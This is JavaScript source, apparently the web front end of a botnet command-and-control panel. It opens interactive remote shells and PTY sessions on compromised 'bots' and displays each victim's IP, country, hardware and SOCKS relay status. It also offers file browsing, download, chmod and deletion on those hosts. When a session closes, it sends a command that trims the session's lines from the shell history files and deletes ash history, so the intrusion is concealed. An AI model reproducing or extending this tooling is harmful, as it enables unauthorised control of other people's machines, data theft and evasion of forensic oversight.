  var overlay = document.getElementById('shell-overlay');
  var output = document.getElementById('shell-output');
  var input = document.getElementById('shell-input');
  document.getElementById('shell-title').textContent = 'Shell: ' + tab.botID;

  // Bot info in header meta
  var b = window._bots && window._bots[tab.botID];
  var meta = document.getElementById('shell-meta');
  if (b) {
    var socksTag = b.socksActive
      ? '<span style="color:var(--green)">SOCKS: <b>ON</b></span>'
      : '<span style="color:var(--text-dim)">SOCKS: OFF</span>';
    meta.innerHTML = '<span><b>' + escHtml(b.ip) + '</b></span>' +
      '<span>Arch: <b>' + escHtml(b.arch) + '</b></span>' + socksTag;
  } else { meta.innerHTML = ''; }

  // Bot info sidebar
  renderInfoSidebar(b);

  // Restore session
  var saved = shellSessions[tab.botID];
  if (saved) {
    output.innerHTML = saved.output;
    shellHistory = saved.cmds.slice();
    shellCwd = saved.cwd || '/';
    shellCmdLog = (saved.cmdLog || []).slice();
    output.scrollTop = output.scrollHeight;
  } else {
    output.innerHTML = '';
    shellHistory = [];
    shellCwd = '/';
    shellCmdLog = [];
  }

  updateBreadcrumb();
  document.getElementById('shell-prompt').textContent = shellCwd + '$ ';
  shellHistIdx = shellHistory.length;
  renderShellTabs();
  overlay.classList.add('open');
  input.focus();
  initShellResize();

  // Connect WebSocket — reuse background session if alive, otherwise open fresh
  if (shellWS) { shellWS.close(); shellWS = null; }
  pendingFileRefresh = false;
  _shellAutoSent = 0;
  shellStreamActive = 0;
  updateStreamIndicator();

  var _bgReused = false;
  if (shellBgSessions[tab.botID] && shellBgSessions[tab.botID].readyState === 1) {
    shellWS = shellBgSessions[tab.botID];
    delete shellBgSessions[tab.botID];
    _bgReused = true;
    updateBgIndicators();
    appendOutput('\n[resumed background session]\n');
  } else {
    delete shellBgSessions[tab.botID]; // stale entry cleanup
    var proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    shellWS = new WebSocket(proto + '//' + location.host + '/ws/shell?botID=' + encodeURIComponent(tab.botID));
  }

  function _shellOnMsg(e) {
    try {
      var d = JSON.parse(e.data);

      // PTY messages — route to xterm.js handler
      if (d.type && d.type.indexOf('pty_') === 0) {
        handlePtyMessage(d);
        return;
      }

      if (d.type === 'file' && d.name && d.data) {
        shellTriggerDownload(d.name, d.data);
        return;
      }
      // Streaming output: per-line stdout
      if (d.type === 'stream_stdout') {
        appendOutput(d.output || '');
        return;
      }
      // Streaming output: per-line stderr (styled)
      if (d.type === 'stream_stderr') {
        appendStderrOutput(d.output || '');
        return;
      }
      // Streaming start ack — show running indicator
      if (d.type === 'stream_start') {
        shellStreamActive++;
        updateStreamIndicator();
        return;
      }
      // Streaming done — hide running indicator
      if (d.type === 'stream_done') {
        shellStreamActive = Math.max(0, shellStreamActive - 1);
        updateStreamIndicator();
        if (d.exitCode && d.exitCode !== 0) {
          appendStderrOutput('[' + (d.error || 'exit code ' + d.exitCode) + ']\n');
        }
        return;
      }
      // Normal output (blocking shell, cd, auto-ls, etc.)
      if (d.output) {
        if (pendingFileRefresh) {
          pendingFileRefresh = false;
          parseFileList(d.output);
        } else {
          appendOutput(d.output);
        }
        var trimmed = d.output.trim();
        if (trimmed.match(/^\/[^\n]*$/) && !trimmed.match(/\s/)) {
          shellCwd = trimmed;
          document.getElementById('shell-prompt').textContent = shellCwd + '$ ';
          updateBreadcrumb();
          updateFbPathInput();
          if (pendingCdRefresh) {
            pendingCdRefresh = false;
            refreshFiles();
          }
        }
      }
    } catch (ex) { }
  }
  shellWS.onmessage = _shellOnMsg;
  shellWS.onclose = function () { appendOutput('\n[Connection closed]\n'); };

  if (_bgReused) {
    var dir = (shellCwd && shellCwd !== '~') ? shellCwd : '/';
    pendingFileRefresh = true;
    shellWS.send(JSON.stringify({ command: 'ls -laF ' + dir }));
    _shellAutoSent++;
  }

  shellWS.onopen = function () {
    var dir = (shellCwd && shellCwd !== '~') ? shellCwd : '/';
    if (!shellCwd || shellCwd === '~') {
      shellCwd = '/';
      document.getElementById('shell-prompt').textContent = '/$ ';
      updateBreadcrumb();
    }
    pendingFileRefresh = true;
    shellWS.send(JSON.stringify({ command: 'ls -laF ' + dir }));
    _shellAutoSent++;
    // Auto-enter PTY mode if default is set
    if (ptyDefaultMode && !ptyMode) {
      setTimeout(function () { enterPtyMode(); }, 200);
    }
  };
  shellWS.onclose = function () { appendOutput('\n[Connection closed]\n'); };
}

function switchShellTab(idx) {
  if (idx === activeShellTab && shellTabs.length > 0) return;
  // Save current state
  if (shellBotID) {
    shellSessions[shellBotID] = {
      output: document.getElementById('shell-output').innerHTML,
      cmds: shellHistory.slice(), cwd: shellCwd, cmdLog: shellCmdLog.slice()
    };
  }
  activateShellTab(idx);
}

function closeShellTab(idx) {
  if (shellTabs.length <= 1) { closeShell(); return; }
  var tab = shellTabs[idx];
  if (tab.botID === shellBotID && shellWS) { shellWS.close(); shellWS = null; }
  shellTabs.splice(idx, 1);
  if (activeShellTab >= shellTabs.length) activeShellTab = shellTabs.length - 1;
  activateShellTab(activeShellTab);
}

function renderShellTabs() {
  var wrap = document.getElementById('shell-tabs');
  if (shellTabs.length <= 1) { wrap.innerHTML = ''; return; }
  wrap.innerHTML = shellTabs.map(function (t, i) {
    var cls = i === activeShellTab ? 'shell-tab active' : 'shell-tab';
    var id = t.botID.length > 10 ? t.botID.substring(0, 10) + '..' : t.botID;
    return '<span class="' + cls + '" onclick="switchShellTab(' + i + ')">' + escHtml(id) +
      '<span class="shell-tab-close" onclick="event.stopPropagation();closeShellTab(' + i + ')">&times;</span></span>';
  }).join('');
}

function closeShell() {
  if (shellBotID) {
    shellSessions[shellBotID] = {
      output: document.getElementById('shell-output').innerHTML,
      cmds: shellHistory.slice(), cwd: shellCwd, cmdLog: shellCmdLog.slice()
    };
    // Wipe only commands from this session — trim last N lines from history files.
    // shellHistory covers user-typed + file-browser cd clicks; _shellAutoSent covers
    // the silent ls -laF commands sent for the file browser.
    if (shellWS && shellWS.readyState === 1) {
      var n = (shellHistory.length || 0) + (_shellAutoSent || 0);
      // Remove the last N lines written during this session; leave older history intact.
      // ash/busybox: no HISTFILE truncation support, just delete entirely.
      var wipe = n > 0
        ? 'N=' + n + '; ' +
        'for f in ~/.bash_history ~/.sh_history; do [ -f "$f" ] && ' +
        'lines=$(wc -l < "$f" 2>/dev/null) && ' +
        'keep=$((lines - N)) && ' +
        '[ "$keep" -gt 0 ] && head -n "$keep" "$f" > "$f.tmp" && mv "$f.tmp" "$f" || > "$f"; done 2>/dev/null; ' +
        'rm -f ~/.ash_history 2>/dev/null; true'
        : 'true';
      shellWS.send(JSON.stringify({ command: wipe }));
    }
    // Keep the WebSocket alive in background to capture any pending output
    if (shellWS && shellWS.readyState === 1) {
      var _bgBotID = shellBotID;
      shellBgSessions[_bgBotID] = shellWS;
      shellWS.onmessage = makeBgMessageHandler(_bgBotID);
      shellWS.onclose = function () {
        delete shellBgSessions[_bgBotID];
        updateBgIndicators();
      };
      shellWS = null;
      updateBgIndicators();
    } else {
      if (shellWS) shellWS.close();
      shellWS = null;
    }
  }
  document.getElementById('shell-overlay').classList.remove('open');
  shellTabs = [];
  document.getElementById('tab-complete').style.display = 'none';
}

function parseAnsi(text) {
  var frag = document.createDocumentFragment();
  var state = { bold: false, italic: false, underline: false, fg: null, bg: null };
  var re = /\x1b\[([0-9;]*)([A-Za-z])/g;
  var lastIndex = 0, match;
  function flush(str) {
    if (!str) return;
    var span = document.createElement('span');
    span.textContent = str;
    var cls = [];
    if (state.bold) cls.push('ansi-bold');
    if (state.italic) cls.push('ansi-italic');
    if (state.underline) cls.push('ansi-underline');
    if (state.fg !== null) cls.push('ansi-fg-' + state.fg);
    if (state.bg !== null) cls.push('ansi-bg-' + state.bg);
    if (cls.length) span.className = cls.join(' ');
    frag.appendChild(span);
  }
  while ((match = re.exec(text)) !== null) {
    flush(text.substring(lastIndex, match.index));
    lastIndex = re.lastIndex;
    if (match[2] !== 'm') continue;
    var codes = match[1] ? match[1].split(';').map(Number) : [0];
    for (var i = 0; i < codes.length; i++) {
      var c = codes[i];
      if (c === 0) { state = { bold: false, italic: false, underline: false, fg: null, bg: null }; }
      else if (c === 1) state.bold = true;
      else if (c === 3) state.italic = true;
      else if (c === 4) state.underline = true;
      else if (c >= 30 && c <= 37) state.fg = c - 30;
      else if (c >= 40 && c <= 47) state.bg = c - 40;
      else if (c >= 90 && c <= 97) state.fg = (c - 90) + 8;
      else if (c >= 100 && c <= 107) state.bg = (c - 100) + 8;
      else if (c === 39) state.fg = null;
      else if (c === 49) state.bg = null;
      else if (c === 22) state.bold = false;
      else if (c === 23) state.italic = false;
      else if (c === 24) state.underline = false;
    }
  }
  flush(text.substring(lastIndex));
  return frag;
}

function appendOutput(text) {
  var el = document.getElementById('shell-output');
  var nearBottom = (el.scrollHeight - el.scrollTop - el.clientHeight) < 60;
  if (text.indexOf('\x1b[') !== -1) {
    el.appendChild(parseAnsi(text));
  } else {
    el.appendChild(parseClickableOutput(text));
  }
  if (nearBottom) el.scrollTop = el.scrollHeight;
}

function appendStderrOutput(text) {
  var el = document.getElementById('shell-output');
  var nearBottom = (el.scrollHeight - el.scrollTop - el.clientHeight) < 60;
  var span = document.createElement('span');
  span.style.color = 'var(--red, #f44)';
  span.textContent = text;
  el.appendChild(span);
  if (nearBottom) el.scrollTop = el.scrollHeight;
}

function updateStreamIndicator() {
  var el = document.getElementById('shell-stream-indicator');
  if (!el) return;
  if (shellStreamActive > 0) {
    el.style.display = 'inline-block';
  } else {
    el.style.display = 'none';
  }
}

function parseClickableOutput(text) {
  var frag = document.createDocumentFragment();
  // Skip parsing on long lines — guards against base64/binary flooding the DOM
  if (text.length > 200) { frag.appendChild(document.createTextNode(text)); return frag; }
  // IPv4 + filesystem paths (only a-z0-9._- components — excludes base64 + chars)
  var re = /(\b(?:\d{1,3}\.){3}\d{1,3}\b)|(\/[a-zA-Z0-9._\-][a-zA-Z0-9._\-\/]*)/g;
  var last = 0, m;
  while ((m = re.exec(text)) !== null) {
    if (m.index > last) frag.appendChild(document.createTextNode(text.slice(last, m.index)));
    var val = m[0], span = document.createElement('span');
    span.textContent = val;
    if (m[1]) {
      span.className = 'out-ip'; span.title = 'Copy IP';
      span.onclick = (function (v) { return function () { try { navigator.clipboard.writeText(v); } catch (e) { } showToast('Copied: ' + v, true); }; })(val);
    } else {
      span.className = 'out-path'; span.title = 'Navigate to path';
      span.onclick = (function (v) { return function () { shellCd(v); }; })(val);
    }
    frag.appendChild(span);
    last = m.index + val.length;
  }
  if (last < text.length) frag.appendChild(document.createTextNode(text.slice(last)));
  return frag;
}

// ---------------------------------------------------------------------------
// Breadcrumb navigation
// ---------------------------------------------------------------------------

function updateBreadcrumb() {
  var bc = document.getElementById('shell-breadcrumb');
  if (!shellCwd || shellCwd === '~') {
    bc.innerHTML = '<span class="bc-seg bc-current">~</span>';
    return;
  }
  var parts = shellCwd.split('/').filter(function (p) { return p !== ''; });
  var html = '<span class="bc-seg" onclick="shellCd(\'/\')">/</span>';
  for (var i = 0; i < parts.length; i++) {
    html += '<span class="bc-sep">/</span>';
    var path = '/' + parts.slice(0, i + 1).join('/');
    if (i === parts.length - 1) {
      html += '<span class="bc-seg bc-current">' + escHtml(parts[i]) + '</span>';
    } else {
      html += '<span class="bc-seg" onclick="shellCd(\'' + path.replace(/'/g, "\\'") + '\')">' + escHtml(parts[i]) + '</span>';
    }
  }
  bc.innerHTML = html;
}

function shellGotoPath(path) {
  path = (path || '').trim();
  if (!path) return;
  shellCd(path);
  document.getElementById('fb-path-input').value = '';
}

function updateFbPathInput() {
  var el = document.getElementById('fb-path-input');
  if (el && !document.activeElement !== el) el.placeholder = shellCwd || '/';
}

function shellCd(path) {
  if (!shellWS || shellWS.readyState !== 1) return;
  // Build absolute path for bare names (file browser clicks)
  if (path !== '..' && path !== '/' && path.charAt(0) !== '/' && path.charAt(0) !== '~') {
    var base = (shellCwd && shellCwd !== '~') ? shellCwd : '/';
    path = base.replace(/\/+$/, '') + '/' + path;
  }
  var cmd = 'cd ' + path;
  var p = document.getElementById('shell-prompt').textContent;
  appendOutput(p + ' ' + cmd + '\n');
  shellWS.send(JSON.stringify({ command: cmd }));
  shellHistory.push(cmd);
  shellHistIdx = shellHistory.length;
  // File browser will auto-refresh once the cd's pwd response arrives
  pendingCdRefresh = true;
}

// ---------------------------------------------------------------------------
// File browser
// ---------------------------------------------------------------------------

function toggleFileSidebar() {
  var sb = document.getElementById('shell-sidebar');
  var btn = document.getElementById('sidebar-expand-btn');
  if (sb.classList.contains('collapsed')) {
    sb.classList.remove('collapsed');
    if (btn) btn.style.display = 'none';
  } else {
    sb.classList.add('collapsed');
    if (btn) btn.style.display = '';
  }
}

function refreshFiles() {
  if (!shellWS || shellWS.readyState !== 1) return;
  pendingFileRefresh = true;
  var dir = (shellCwd && shellCwd !== '~') ? shellCwd : '/';
  shellWS.send(JSON.stringify({ command: 'ls -laF ' + dir }));
  _shellAutoSent++;
}

function parseFileList(output) {
  var wrap = document.getElementById('file-list');
  var lines = output.trim().split('\n');
  var entries = [];

  lines.forEach(function (line) {
    line = line.trim();
    if (!line || line.match(/^total\s/)) return;
    // Parse ls -la output: perms links owner group size month day time name
    var m = line.match(/^([drwxlsStT\-]{10})\s+\S+\s+\S+\s+\S+\s+(\S+)\s+\S+\s+\S+\s+\S+\s+(.+)$/);
    if (!m) return;
    var perms = m[1], sizeStr = m[2], name = m[3];
    var isDir = perms[0] === 'd';
    var isLink = perms[0] === 'l';
    var isExec = !isDir && !isLink && (perms[3] === 'x' || perms[6] === 'x' || perms[9] === 'x');
    // Clean name (remove trailing / or @ or * from ls -F)
    var displayName = name.replace(/[@*\/]$/, '');
    if (name.endsWith('/')) isDir = true;
    if (displayName === '.' || displayName === '..') return;
    // Handle symlinks: name -> target
    if (isLink && displayName.indexOf(' -> ') !== -1) {
      displayName = displayName.split(' -> ')[0];
    }
    // Human-readable file size
    var bytes = parseInt(sizeStr, 10);
    var size = '';
    if (!isDir && !isNaN(bytes)) {
      if (bytes < 1024) size = bytes + 'B';
      else if (bytes < 1048576) size = (bytes / 1024).toFixed(1) + 'K';
      else if (bytes < 1073741824) size = (bytes / 1048576).toFixed(1) + 'M';
      else size = (bytes / 1073741824).toFixed(1) + 'G';
    }
    entries.push({ name: displayName, isDir: isDir, isLink: isLink, isExec: isExec, size: size });
  });

  // Sort: dirs first, then files
  entries.sort(function (a, b) {
    if (a.isDir && !b.isDir) return -1;
    if (!a.isDir && b.isDir) return 1;
    return a.name.localeCompare(b.name);
  });

  if (!entries.length) {
    wrap.innerHTML = '<div class="file-empty">Empty directory</div>';
    return;
  }

  // Add parent dir entry
  var html = '<div class="file-entry fe-dir" onclick="shellCd(\'..\')"><span class="file-icon">..</span><span>../</span></div>';
  entries.forEach(function (e) {
    var cls = 'file-entry';
    var icon = '&#128196;';
    var click = '';
    var dlBtn = '';
    var eName = e.name.replace(/'/g, "\\'");
    var ctx = 'oncontextmenu="event.preventDefault();showFileCtx(event,\'' + eName + '\',' + (e.isDir ? 'true' : 'false') + ')"';
    if (e.isDir) {
      cls += ' fe-dir'; icon = '&#128193;';
      click = 'onclick="shellCd(\'' + eName + '\')"';
    } else if (e.isLink) {
      cls += ' fe-link'; icon = '&#128279;';
      click = 'onclick="shellSendCmd(\'cat ' + eName + '\')"';
      dlBtn = '<span class="file-dl-btn" onclick="event.stopPropagation();shellDownloadFile(\'' + eName + '\')" title="Download">&#8681;</span>';
    } else if (e.isExec) {
      cls += ' fe-exec'; icon = '&#9881;';
      click = 'onclick="shellSendCmd(\'file ' + eName + '\')"';
      dlBtn = '<span class="file-dl-btn" onclick="event.stopPropagation();shellDownloadFile(\'' + eName + '\')" title="Download">&#8681;</span>';
    } else {
      click = 'onclick="shellSendCmd(\'cat ' + eName + '\')"';
      dlBtn = '<span class="file-dl-btn" onclick="event.stopPropagation();shellDownloadFile(\'' + eName + '\')" title="Download">&#8681;</span>';
    }
    var sizeHtml = e.size ? '<span class="file-size">' + e.size + '</span>' : '';
    html += '<div class="' + cls + '" ' + click + ' ' + ctx + '><span class="file-icon">' + icon + '</span><span>' + escHtml(e.name) + (e.isDir ? '/' : '') + '</span>' + sizeHtml + dlBtn + '</div>';
  });
  wrap.innerHTML = html;
}

function shellSendCmd(cmd) {
  if (!shellWS || shellWS.readyState !== 1) return;
  var p = document.getElementById('shell-prompt').textContent;
  appendOutput(p + ' ' + cmd + '\n');
  var useStream = !cmd.match(/^!/) && !cmd.match(/^cd(\s|$)/);
  shellWS.send(JSON.stringify({ command: cmd, stream: useStream }));
  shellHistory.push(cmd);
  shellHistIdx = shellHistory.length;
  shellCmdLog.push({ ts: Date.now(), cmd: cmd });
  renderHistoryPanel();
}

// Background shell session helpers
// ---------------------------------------------------------------------------

function makeBgMessageHandler(botID) {
  return function (e) {
    try {
      var d = JSON.parse(e.data);
      if (!d) return;
      if (d.type === 'file' && d.name && d.data) {
        // Trigger download even while backgrounded — user already requested it
        shellTriggerDownload(d.name, d.data);
        return;
      }
      // Handle streaming output in background — accumulate into session
      if (d.type === 'stream_stdout' || d.type === 'stream_stderr') {
        if (!shellSessions[botID]) {
          shellSessions[botID] = { output: '', cmds: [], cwd: '/', cmdLog: [] };
        }
        var span = document.createElement('span');
        if (d.type === 'stream_stderr') span.style.color = 'var(--red, #f44)';
        span.textContent = d.output || '';
        shellSessions[botID].output += span.outerHTML;
        return;
      }
      if (d.output) {
        if (!shellSessions[botID]) {
          shellSessions[botID] = { output: '', cmds: [], cwd: '/', cmdLog: [] };
        }
        // Append to stored HTML — same escaping as appendOutput plain-text path
        var span = document.createElement('span');
        span.textContent = d.output;
        shellSessions[botID].output += span.outerHTML;
        // Track cwd changes in background too
        var trimmed = d.output.trim();
        if (trimmed.match(/^\/[^\n]*$/) && !trimmed.match(/\s/)) {
          shellSessions[botID].cwd = trimmed;
        }
      }
    } catch (ex) { }
  };
}

function updateBgIndicators() {
  document.querySelectorAll('.bot-row').forEach(function (row) {
    var bid = row.getAttribute('data-botid');
    var active = shellBgSessions[bid] && shellBgSessions[bid].readyState === 1;
    row.classList.toggle('shell-bg-active', !!active);
  });
}

// ---------------------------------------------------------------------------
function shellCtrlC() {
  var inp = document.getElementById('shell-input');
  if (inp.value) {
    appendOutput(inp.value + ' ^C\n');
    inp.value = '';
  } else {
    appendOutput('^C\n');
    // Reset streaming state without killing the connection
    shellStreamActive = 0;
    updateStreamIndicator();
    // If WS is dead or stuck, reconnect transparently
    if (!shellWS || shellWS.readyState !== 1) {
      _shellReconnect();
    }
  }
  inp.focus();
}

function _shellReconnect() {
  if (shellWS) { shellWS.close(); shellWS = null; }
  if (!shellBotID) return;
  var proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
  shellWS = new WebSocket(proto + '//' + location.host + '/ws/shell?botID=' + encodeURIComponent(shellBotID));
  shellWS.onmessage = _shellOnMsg;
  shellWS.onclose = function () { appendOutput('\n[Connection closed]\n'); };
  shellWS.onopen = function () {
    appendOutput('[Reconnected]\n');
    var dir = (shellCwd && shellCwd !== '~') ? shellCwd : '/';
    pendingFileRefresh = true;
    shellWS.send(JSON.stringify({ command: 'ls -laF ' + dir }));
  };
}

// ---------------------------------------------------------------------------
// Bot info sidebar
// ---------------------------------------------------------------------------

function renderInfoSidebar(b) {
  var body = document.getElementById('info-sidebar-body');
  if (!b) { body.innerHTML = '<div class="file-empty">No bot info</div>'; return; }
  body.innerHTML =
    '<div class="isb-row"><span class="isb-label">Bot ID</span><span class="isb-val" style="color:var(--blue)">' + escHtml(b.botID) + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">IP Address</span><span class="isb-val">' + escHtml(b.ip) + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">Country</span><span class="isb-val" style="color:var(--cyan)">' + escHtml(b.country) + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">Architecture</span><span class="isb-val">' + escHtml(b.arch) + '</span></div>' +
    '<div class="isb-divider"></div>' +
    '<div class="isb-row"><span class="isb-label">RAM</span><span class="isb-val">' + formatRAM(b.ram) + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">CPU Cores</span><span class="isb-val">' + b.cpuCores + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">Process</span><span class="isb-val">' + escHtml(b.processName) + '</span></div>' +
    '<div class="isb-divider"></div>' +
    '<div class="isb-row"><span class="isb-label">Uptime</span><span class="isb-val">' + escHtml(b.uptime) + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">Last Ping</span><span class="isb-val" id="isb-ping">' + ago(b.lastPing) + '</span></div>' +
    '<div class="isb-divider"></div>' +
    '<div class="isb-row"><span class="isb-label">SOCKS</span><span class="isb-val" style="color:' + (b.socksActive ? 'var(--green)' : 'var(--text-dim)') + '">' + (b.socksActive ? 'ON' : 'OFF') + '</span></div>' +
    (b.socksActive && b.socksRelay ? '<div class="isb-row"><span class="isb-label">Relay</span><span class="isb-val" style="color:var(--accent)">' + escHtml(b.socksRelay) + '</span></div>' : '');
}

// ---------------------------------------------------------------------------
// Sidebar tabs (Info / History)
// ---------------------------------------------------------------------------

function switchSidebarTab(idx) {
  document.getElementById('isb-tab-info').classList.toggle('isb-tab-active', idx === 0);
  document.getElementById('isb-tab-hist').classList.toggle('isb-tab-active', idx === 1);
  document.getElementById('info-sidebar-body').style.display = idx === 0 ? '' : 'none';
  document.getElementById('info-sidebar-hist').style.display = idx === 1 ? 'flex' : 'none';
  if (idx === 1) renderHistoryPanel();
}

function renderHistoryPanel() {
  var list = document.getElementById('hist-list');
  if (!list) return;
  var q = (document.getElementById('hist-search') || {}).value || '';
  q = q.toLowerCase();
  var items = shellCmdLog.filter(function (h) { return !q || h.cmd.toLowerCase().indexOf(q) !== -1; });
  if (!items.length) { list.innerHTML = '<div style="padding:10px;font-size:11px;color:var(--text-dim);text-align:center">' + (q ? 'No matches' : 'No history yet') + '</div>'; return; }
  var html = '';
  for (var i = items.length - 1; i >= 0; i--) {
    var h = items[i];
    var d = new Date(h.ts);
    var ts = d.getHours().toString().padStart(2, '0') + ':' + d.getMinutes().toString().padStart(2, '0') + ':' + d.getSeconds().toString().padStart(2, '0');
    var ec = h.cmd.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
    html += '<div class="hist-item" onclick="shellHistInsert(\'' + ec + '\')">' +
      '<div class="hist-ts">' + ts + '<span class="hist-rerun">&#9654; Run</span></div>' +
      '<div class="hist-cmd">' + escHtml(h.cmd) + '</div></div>';
  }
  list.innerHTML = html;
}

function shellHistInsert(cmd) {
  var inp = document.getElementById('shell-input');
  inp.value = cmd;
  inp.focus();
  switchSidebarTab(0); // switch back to info so terminal is accessible
}

// ---------------------------------------------------------------------------
// File context menu
// ---------------------------------------------------------------------------

function showFileCtx(e, name, isDir) {
  _ctxEntry = { name: name, isDir: isDir, cwd: shellCwd };
  var m = document.getElementById('file-ctx-menu');
  // Show/hide dir-only vs file-only items
  document.getElementById('ctx-cd-item').style.display = isDir ? '' : 'none';
  document.getElementById('ctx-pty-item').style.display = (isDir && !ptyMode) ? '' : 'none';
  document.getElementById('ctx-cat-item').style.display = !isDir ? '' : 'none';
  document.getElementById('ctx-dl-item').style.display = !isDir ? '' : 'none';
  document.getElementById('ctx-chmod-item').style.display = !isDir ? '' : 'none';
  // Position
  var x = e.clientX, y = e.clientY;
  if (x + 170 > window.innerWidth) x = window.innerWidth - 175;
  if (y + 220 > window.innerHeight) y = window.innerHeight - 225;
  m.style.left = x + 'px'; m.style.top = y + 'px'; m.style.display = 'block';
  e.stopPropagation();
}

function hideFileCtx() { document.getElementById('file-ctx-menu').style.display = 'none'; }
document.addEventListener('click', hideFileCtx);
document.addEventListener('keydown', function (e) { if (e.key === 'Escape') hideFileCtx(); });

function ctxPath() {
  if (!_ctxEntry) return '';
  var base = _ctxEntry.cwd === '~' ? '' : _ctxEntry.cwd;
  return (base ? base + '/' : '') + _ctxEntry.name;
}
function ctxCopyPath() {
  var p = ctxPath();
  try { navigator.clipboard.writeText(p); } catch (e) { }
  showToast('Copied: ' + p, true);
  hideFileCtx();
}
function ctxCd() { shellCd(_ctxEntry.name); hideFileCtx(); }
function ctxOpenPty() {
  hideFileCtx();
  if (ptyMode) return;
  // Enter PTY mode then cd into the directory
  enterPtyMode();
  // Wait for PTY_OPENED then send cd command
  setTimeout(function () {
    var dir = ctxPath();
    if (shellWS && shellWS.readyState === 1) {
      var cdCmd = 'cd ' + dir.replace(/'/g, "'\\\\''") + '\r';
      var b64 = btoa(cdCmd);
      shellWS.send(JSON.stringify({ type: 'pty_input', data: cdCmd }));
    }
  }, 600);
}
function ctxCat() { shellSendCmd('cat ' + shellQuoteJs(_ctxEntry.name)); hideFileCtx(); }
function ctxDownload() { shellDownloadFile(_ctxEntry.name); hideFileCtx(); }
function ctxChmod() { shellSendCmd('chmod +x ' + shellQuoteJs(_ctxEntry.name)); hideFileCtx(); }
function ctxDelete() {
  if (!confirm('Delete ' + _ctxEntry.name + '?')) { hideFileCtx(); return; }
  shellSendCmd((_ctxEntry.isDir ? 'rm -rf ' : 'rm -f ') + shellQuoteJs(_ctxEntry.name));
  hideFileCtx();
  setTimeout(refreshFiles, 800);
}
function ctxRename() {
  var n = prompt('Rename to:', _ctxEntry.name);
  hideFileCtx();
  if (n && n !== _ctxEntry.name) {
    shellSendCmd('mv ' + shellQuoteJs(_ctxEntry.name) + ' ' + shellQuoteJs(n));
    setTimeout(refreshFiles, 800);
  }
}
function shellQuoteJs(s) { return "'" + s.replace(/'/g, "'\\''") + "'"; }

// ---------------------------------------------------------------------------
// Tab completion
// ---------------------------------------------------------------------------

function showTabComplete(input) {
  var val = input.value;
  if (!val.startsWith('!')) { hideTabComplete(); return; }
  tcMatches = tcCommands.filter(function (c) { return c.cmd.indexOf(val) === 0; });
  if (!tcMatches.length) { hideTabComplete(); return; }
  tcIdx = 0;
  var wrap = document.getElementById('tab-complete');
  wrap.innerHTML = tcMatches.map(function (c, i) {
    return '<div class="tc-item' + (i === 0 ? ' tc-active' : '') + '" data-idx="' + i + '" onclick="selectTabComplete(' + i + ')">' +
      '<span class="tc-cmd">' + escHtml(c.cmd) + '</span><span class="tc-desc">' + escHtml(c.desc) + '</span></div>';
  }).join('');
  wrap.style.display = 'block';
}

function hideTabComplete() {
  document.getElementById('tab-complete').style.display = 'none';
  tcIdx = -1; tcMatches = [];
}

function selectTabComplete(idx) {
  if (idx >= 0 && idx < tcMatches.length) {
    var input = document.getElementById('shell-input');
    input.value = tcMatches[idx].cmd + ' ';
    input.focus();
  }
  hideTabComplete();
}

function navigateTabComplete(dir) {
  if (!tcMatches.length) return;
  tcIdx = (tcIdx + dir + tcMatches.length) % tcMatches.length;
  var items = document.querySelectorAll('#tab-complete .tc-item');
  items.forEach(function (it, i) {
    it.classList.toggle('tc-active', i === tcIdx);
  });
}

// ---------------------------------------------------------------------------
// Shell action buttons
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// Shell resize / zoom / maximize
// ---------------------------------------------------------------------------

var _shellFontSize = 13;
function shellZoom(delta) {
  _shellFontSize = Math.max(9, Math.min(22, _shellFontSize + delta));
  document.querySelectorAll('.shell-output').forEach(function (el) {
    el.style.fontSize = _shellFontSize + 'px';
  });
}

function toggleShellMaximize() {
  var modal = document.querySelector('.shell-modal');
  if (!modal) return;
  var isMax = modal.classList.toggle('shell-maximized');
  var btn = document.getElementById('shell-max-btn');
  if (btn) btn.title = isMax ? 'Restore' : 'Maximize';
  if (!isMax) { modal.style.width = ''; modal.style.height = ''; }
}

function initShellResize() {
  var handle = document.getElementById('shell-resize-handle');
  if (!handle || handle._resizeInited) return;
  handle._resizeInited = true;
  handle.addEventListener('mousedown', function (e) {
    var modal = document.querySelector('.shell-modal');
    if (!modal) return;
    var sx = e.clientX, sy = e.clientY, sw = modal.offsetWidth, sh = modal.offsetHeight;
    e.preventDefault();
    function onMove(e) {
      modal.classList.remove('shell-maximized');
      modal.style.width = Math.max(480, sw + (e.clientX - sx)) + 'px';
      modal.style.height = Math.max(320, sh + (e.clientY - sy)) + 'px';
      modal.style.maxWidth = 'none'; modal.style.maxHeight = 'none';
    }
    function onUp() {
      document.removeEventListener('mousemove', onMove);
      document.removeEventListener('mouseup', onUp);
    }
    document.addEventListener('mousemove', onMove);
    document.addEventListener('mouseup', onUp);
  });
}

function copyShellOutput() {
  var text = document.getElementById('shell-output').textContent;
  if (!text) { showToast('Nothing to copy', false); return; }
  navigator.clipboard.writeText(text).then(function () { showToast('Output copied to clipboard', true); })
    .catch(function () { showToast('Copy failed', false); });
}

function saveShellHistory() {
  var content = document.getElementById('shell-output').textContent;
  if (!content) { showToast('Nothing to save', false); return; }
  var blob = new Blob([content], { type: 'text/plain' });
  var a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'shell_' + shellBotID + '_' + new Date().toISOString().slice(0, 19).replace(/[:T]/g, '-') + '.txt';
  a.click(); URL.revokeObjectURL(a.href);
}

function clearShellHistory() {
  document.getElementById('shell-output').innerHTML = '';
  document.getElementById('file-list').innerHTML = '<div class="file-empty">Send a command to populate</div>';
  shellHistory = []; shellHistIdx = 0; shellCmdLog = [];
  shellCwd = '/';
  document.getElementById('shell-prompt').textContent = '/$ ';
  updateBreadcrumb();
  if (shellBotID) delete shellSessions[shellBotID];
  renderHistoryPanel();
  // Re-populate file browser from /
  if (shellWS && shellWS.readyState === 1) {
    pendingFileRefresh = true;
    shellWS.send(JSON.stringify({ command: 'ls -laF /' }));
  }
}

// ---------------------------------------------------------------------------
// PTY MODE — Full interactive terminal via xterm.js
// ---------------------------------------------------------------------------

var ptyMode = false;
var ptyTerm = null;
var ptyFitAddon = null;
var ptyDefaultMode = lsGet('ptyDefault') === true;

// Init PTY default button state
(function () {
